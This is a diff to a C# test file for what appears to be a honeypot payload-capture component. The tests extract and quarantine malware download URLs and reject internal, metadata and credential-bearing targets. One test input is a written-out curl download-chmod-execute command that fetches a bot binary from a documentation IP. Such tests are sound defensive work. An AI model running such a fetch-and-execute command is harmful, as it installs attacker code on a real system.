@@ -403,6 +403,38 @@ public class DataHarvesterTests
     }
 
     [Fact]
+    public void TrySanitizePayloadDownloadTarget_StripsCommandShellFlagsAndRejectsInternalTargets()
+    {
+        Assert.True(DataHarvester.TrySanitizePayloadDownloadTarget(
+            "curl -fsSL 'http://198.51.100.44:8080/bins/x86_64.elf' -o /tmp/bot && chmod +x /tmp/bot; /tmp/bot",
+            out var sanitizedUri,
+            out var sanitizedFileName));
+        Assert.Equal("http://198.51.100.44:8080/bins/x86_64.elf", sanitizedUri.AbsoluteUri);
+        Assert.Equal("x86_64.elf", sanitizedFileName);
+
+        Assert.False(DataHarvester.TrySanitizePayloadDownloadTarget(
+            "http://127.0.0.1:8080/internal",
+            out _,
+            out _,
+            out var reasonLoopback));
+        Assert.Equal("forbidden_internal_host", reasonLoopback);
+
+        Assert.False(DataHarvester.TrySanitizePayloadDownloadTarget(
+            "http://169.254.169.254/latest/meta-data/",
+            out _,
+            out _,
+            out var reasonMetadata));
+        Assert.Equal("forbidden_internal_host", reasonMetadata);
+
+        Assert.False(DataHarvester.TrySanitizePayloadDownloadTarget(
+            "http://user:secret@198.51.100.44/payload.bin",
+            out _,
+            out _,
+            out var reasonCreds));
+        Assert.Equal("credentials_not_allowed", reasonCreds);
+    }
+
+    [Fact]
     public async Task CapturePayloadMetadataAsync_DownloadsCurlBinaryToReadOnlyQuarantineWithMetadataAndAnalysis()
     {
         var previousLogDir = Program.LogDir;
@@ -452,7 +484,7 @@ public class DataHarvesterTests
 
             var uploadDir = Path.Combine(tempDir, "uploads", "deadbeef");
             Assert.True(Directory.Exists(uploadDir));
-            var savedFile = Assert.Single(Directory.GetFiles(uploadDir, "*_kworker.quarantine"));
+            var savedFile = Assert.Single(Directory.GetFiles(uploadDir, "*_miner.elf.quarantine"));
             Assert.Equal(elfPayload, File.ReadAllBytes(savedFile));
             Assert.True((File.GetAttributes(savedFile) & FileAttributes.ReadOnly) == FileAttributes.ReadOnly);
             if (!System.Runtime.InteropServices.RuntimeInformation.IsOSPlatform(System.Runtime.InteropServices.OSPlatform.Windows))
@@ -466,7 +498,8 @@ public class DataHarvesterTests
             Assert.NotNull(meta);
             Assert.Equal("url_payload", meta!.Source);
             Assert.Equal("captured", meta.Status);
-            Assert.Equal("kworker", meta.OriginalFilename);
+            Assert.Equal("miner.elf", meta.OriginalFilename);
+            Assert.Equal("http://198.51.100.77/bins/miner.elf", meta.CommandText);
             Assert.Equal("ELF 64-bit LSB", meta.Analysis.FileFormat);
             Assert.Equal("x86-64", meta.Analysis.Architecture);
             Assert.Contains("crypto-miner:xmrig", meta.Analysis.SuspiciousIndicators);
